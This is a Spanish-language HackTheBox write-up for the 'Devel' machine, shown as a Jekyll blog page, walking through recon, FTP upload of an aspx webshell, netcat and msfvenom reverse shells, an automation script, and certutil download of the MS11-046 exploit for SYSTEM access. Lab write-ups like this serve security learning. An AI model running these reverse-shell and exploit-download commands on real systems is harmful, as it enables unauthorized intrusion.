@@ -1,0 +1,695 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB Devel - Bast1ant1c</title>
+<meta name="description" content="Vamos a resolver la máquina Devel de HackTheBox. ¡Let’s hack!">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Bast1ant1c">
+<meta property="og:title" content="HTB Devel">
+<meta property="og:url" content="http://localhost:4000/devel/">
+
+
+  <meta property="og:description" content="Vamos a resolver la máquina Devel de HackTheBox. ¡Let’s hack!">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/devel/01-inicio.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-10-12T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/devel/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Bast1ant1c",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Bast1ant1c Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Blog</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscar</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">HTB Devel</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name"></h3>
+    
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB Devel">
+    <meta itemprop="description" content="Vamos a resolver la máquina Devel de HackTheBox. ¡Let’s hack!">
+    <meta itemprop="datePublished" content="October 12, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB Devel
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-10-12T00:00:00-05:00">October 12, 2022 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/assets/images/devel/02-tarjeta.png" />
+</p>
+
+<p>¡Hola!
+En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">devel</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
+La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
+
+<h2 id="preparación">PREPARACIÓN</h2>
+
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">devel</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack devel
+<span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
+</code></pre></div></div>
+
+<h2 id="reconocimiento">RECONOCIMIENTO</h2>
+
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.5
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detectando sistema operativo ...
+
+<span class="o">[</span>+] 10.10.10.5 <span class="nv">ttl</span><span class="o">=</span>127 <span class="o">&gt;&gt;</span> Windows
+</code></pre></div></div>
+
+<p>Identificamos que es una maquina <strong>Windows</strong> debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).</p>
+
+<ul>
+  <li>TTL =&gt; 64	Linux</li>
+  <li>TTL =&gt; 128	Windows</li>
+</ul>
+
+<p>Continuamos con la enumeración de los <strong>65535</strong> puertos en la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.5 <span class="nt">-oG</span> ports | <span class="nb">grep </span>open
+21/tcp open  ftp
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap <span class="nt">-p21</span>,80 <span class="nt">-sCV</span> 10.10.10.5 <span class="nt">-oN</span> versions
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-title: IIS7
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<h2 id="reconocimiento-ftp">RECONOCIMIENTO FTP</h2>
+
+<p>Iniciamos con el reconocimiento del servicio <code class="language-plaintext highlighter-rouge">ftp</code> donde inicialmente probamos el acceso al servicio con el usuario <code class="language-plaintext highlighter-rouge">anonymous</code> y sin contraseña, logando el acceso y la capacidad de ejecutar comandos en este servicio.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name <span class="o">(</span>10.10.10.5:bast1ant1c<span class="o">)</span>: anonymous
+331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password:
+230 User logged <span class="k">in</span><span class="nb">.</span>
+Remote system <span class="nb">type </span>is Windows_NT.
+ftp&gt; <span class="nb">dir
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+</code></pre></div></div>
+
+<h2 id="reconocimiento-web">RECONOCIMIENTO WEB</h2>
+
+<p>Procedemos a revisar la página web por el puerto <code class="language-plaintext highlighter-rouge">80</code>, obteniendo una página por defecto de un servidor <code class="language-plaintext highlighter-rouge">IIS</code>.</p>
+
+<p align="center">
+<img src="/assets/images/devel/03-page.png" />
+</p>
+
+<p>Inspeccionando el contenido podemos ver que la imagen se denomina como <code class="language-plaintext highlighter-rouge">welcome.png</code>, recurso que vimos anteriormente en el reconocimiento ftp.</p>
+
+<p align="center">
+<img src="/assets/images/devel/04-page2.png" />
+</p>
+
+<p>En esta ocasión mostraré dos maneras de realizar la intrusión a la máquina, pero antes de esto, vamos a ingresar a la carpeta <code class="language-plaintext highlighter-rouge">exploit</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../exploit
+</code></pre></div></div>
+<h2 id="intrusion-webshell">INTRUSION WEBSHELL</h2>
+<p>Vamos a localizar una webshell de <code class="language-plaintext highlighter-rouge">aspx</code> y la utilidad <code class="language-plaintext highlighter-rouge">nc.exe</code> para poder obtener nuestra primera intrusión.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate .aspx
+<span class="nb">cp</span> /usr/share/davtest/backdoors/aspx_cmd.aspx console.aspx
+locate nc.exe
+<span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Nos conectamos nuevamente por <code class="language-plaintext highlighter-rouge">ftp</code> y cargamos la webshell que denominamos como <code class="language-plaintext highlighter-rouge">console.aspx</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name <span class="o">(</span>10.10.10.5:bast1ant1c<span class="o">)</span>: anonymous
+331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password:
+230 User logged <span class="k">in</span><span class="nb">.</span>
+Remote system <span class="nb">type </span>is Windows_NT.
+ftp&gt; put console.aspx 
+<span class="nb">local</span>: console.aspx remote: console.aspx
+200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+226 Transfer complete.
+1438 bytes sent <span class="k">in </span>0.00 secs <span class="o">(</span>18.7861 MB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Tenemos nuestra webshell en la máquina y lo podemos comprobar al ingresar al recurso en el navegador <code class="language-plaintext highlighter-rouge">http://10.10.10.5/console.aspx</code></p>
+
+<p align="center">
+<img src="/assets/images/devel/05-page3.png" />
+</p>
+
+<p>Activamos el servicio <code class="language-plaintext highlighter-rouge">smb</code> con <code class="language-plaintext highlighter-rouge">impacket</code> para compartir los archivos que tenemos en la carpeta <code class="language-plaintext highlighter-rouge">exploit</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
+</code></pre></div></div>
+
+<p>Creamos un listener por el puerto que elegimos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lvnp</span> 4564
+</code></pre></div></div>
+
+<p>En la webshell ingresamos el siguiente comando que nos va a permitir ejecutar <code class="language-plaintext highlighter-rouge">nc.exe</code> directamente en la máquina víctima y así generar una reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\\</span>10.10.14.15<span class="se">\s</span>mbFolder<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd 10.10.14.15 4564
+</code></pre></div></div>
+
+<p>Finalmente obtenemos acceso a una shell de la máquina victima con el usuario <code class="language-plaintext highlighter-rouge">iis apppool\web</code>.</p>
+
+<p align="center">
+<img src="/assets/images/devel/06-page4.png" />  
+</p>
+
+<h2 id="instusion-msfvenom">INSTUSION MSFVENOM</h2>
+
+<p>Para la siguiente intrusión vamos a crear con <code class="language-plaintext highlighter-rouge">msfvenom</code> una reverse shell indicando el formato <code class="language-plaintext highlighter-rouge">aspx</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.15 <span class="nv">LPORT</span><span class="o">=</span>4564 <span class="nt">-f</span> aspx <span class="nt">-o</span> reverseShell.aspx
+</code></pre></div></div>
+
+<p>Cargamos la reverse shell al servidor <code class="language-plaintext highlighter-rouge">ftp</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name <span class="o">(</span>10.10.10.5:bast1ant1c<span class="o">)</span>: anonymous
+331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password:
+230 User logged <span class="k">in</span><span class="nb">.</span>
+Remote system <span class="nb">type </span>is Windows_NT.
+ftp&gt; put reverseShell.aspx 
+<span class="nb">local</span>: reverseShell.aspx remote: reverseShell.aspx
+200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+226 Transfer complete.
+2765 bytes sent <span class="k">in </span>0.00 secs <span class="o">(</span>23.7559 MB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Creamos un listener por el puerto que elegimos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lvnp</span> 4564
+</code></pre></div></div>
+
+<p>En el navegador vamos a la ruta <code class="language-plaintext highlighter-rouge">http://10.10.10.5/reverseShell.aspx</code> y logramos tener acceso por otra vía a la máquina víctima.</p>
+
+<p align="center">
+<img src="/assets/images/devel/07-page5.png" />  
+</p>
+
+<h2 id="script-de-intrusion-pwntrutionsh">SCRIPT DE INTRUSION PWNTRUTION.SH</h2>
+
+<p>Comparto el script que realicé para automatizar la intrusión de esta máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">##!/bin/bash</span>
+<span class="c">#Author: Bast1ant1c</span>
+
+<span class="c"># $1 = IP local</span>
+<span class="c"># $2 = Puerto</span>
+<span class="c"># $3 = ReverseShell</span>
+<span class="c"># $4 = IP victima</span>
+<span class="c"># Cambiar USER y PASS si es necesario</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+	</span><span class="nb">echo</span> <span class="s1">'''
+[*] How to use
+[+] ./pwntrution.sh &lt;IP_Local&gt; &lt;Port&gt; &lt;RevShell_Name&gt; &lt;IP_Victim&gt;'''</span>
+<span class="k">else
+
+</span><span class="nb">echo</span> <span class="s2">"[*] Generando payload"</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$1</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$2</span> <span class="nt">-f</span> aspx <span class="nt">-o</span> <span class="nv">$3</span>.aspx 2&gt;/dev/null
+
+<span class="nb">echo</span> <span class="s2">"[*] Carga de payload"</span>
+ftp <span class="nt">-n</span> <span class="nv">$4</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh">
+quote USER anonymous
+quote PASS 
+put </span><span class="nv">$3</span><span class="sh">.aspx
+quit
+</span><span class="no">EOF
+
+</span><span class="nb">echo</span> <span class="s2">"[*] Ejecución de payload"</span>
+curl <span class="nt">-s</span> http://<span class="nv">$4</span>/<span class="nv">$3</span>.aspx
+
+<span class="nb">echo</span> <span class="s2">"[*] Descargando exploit ms11-046"</span>
+wget https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe 2&gt;/dev/null
+
+<span class="nb">echo</span> <span class="s2">"[*] Obteniendo acceso"</span>
+rlwrap nc <span class="nt">-lvnp</span> <span class="nv">$2</span> 2&gt;/dev/null
+<span class="k">fi</span>
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/images/devel/08-page6.png" />  
+</p>
+
+<h2 id="escalada-de-privilegios">ESCALADA DE PRIVILEGIOS</h2>
+
+<p>Realizamos como primer paso una enumeración basica, por medio del comando <code class="language-plaintext highlighter-rouge">systeminfo</code>, obteniendo información interesante en cuanto a la versión del sistema operativo actual.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systeminfo
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+</code></pre></div></div>
+
+<p>Luego de un poco de investigación de la versión de Windows <code class="language-plaintext highlighter-rouge">6.1.7600</code>, encontramos que es vulnerable al script <a href="https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe">MS11-046.exe</a> del github de <a href="https://github.com/abatchy17">abatchy17</a>, por ende, procedemos a descargar este recurso.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe
+</code></pre></div></div>
+
+<p>Al obtener el exploit, activamos un servidor <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python</code> por el puerto <code class="language-plaintext highlighter-rouge">80</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>En la máquina víctima realizamos la descarga desde la carpeta <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code> del exploit por medio de la utilidad <code class="language-plaintext highlighter-rouge">certutil.exe</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.15/MS11-046.exe
+MS11-046.exe
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+</code></pre></div></div>
+
+<p>¡Listo! Logramos una shell con un usuario administrador.</p>
+
+<h2 id="flags">FLAGS</h2>
+
+<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\</span>
+<span class="nb">dir</span> /b/s user.txt
+C:<span class="se">\U</span>sers<span class="se">\b</span>abis<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+<span class="nb">set</span> /P <span class="nv">user</span><span class="o">=</span>&lt;<span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\b</span><span class="s2">abis</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span>
+echo.%user:~0,10%
+455111f4a9
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> /b/s root.txt
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+<span class="nb">set</span> /P <span class="nv">root</span><span class="o">=</span>&lt;<span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\A</span><span class="s2">dministrator</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\r</span><span class="s2">oot.txt"</span>
+echo.%root:~0,10%
+655befe588
+</code></pre></div></div>
+
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">devel</code> de HackTheBox!</p>
+
+<p align="center">
+<img src="/assets/images/devel/09-finish.png" />
+</p>
+
+<p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>
+
+<p><strong>Nos vemos en otro bit.</strong></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#devel" class="page__taxonomy-item" rel="tag">Devel</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-10-12T00:00:00-05:00">October 12, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/bashed/" class="pagination--pager" title="HTB Bashed
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+<!--
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+-->
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 Bast1ant1c</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
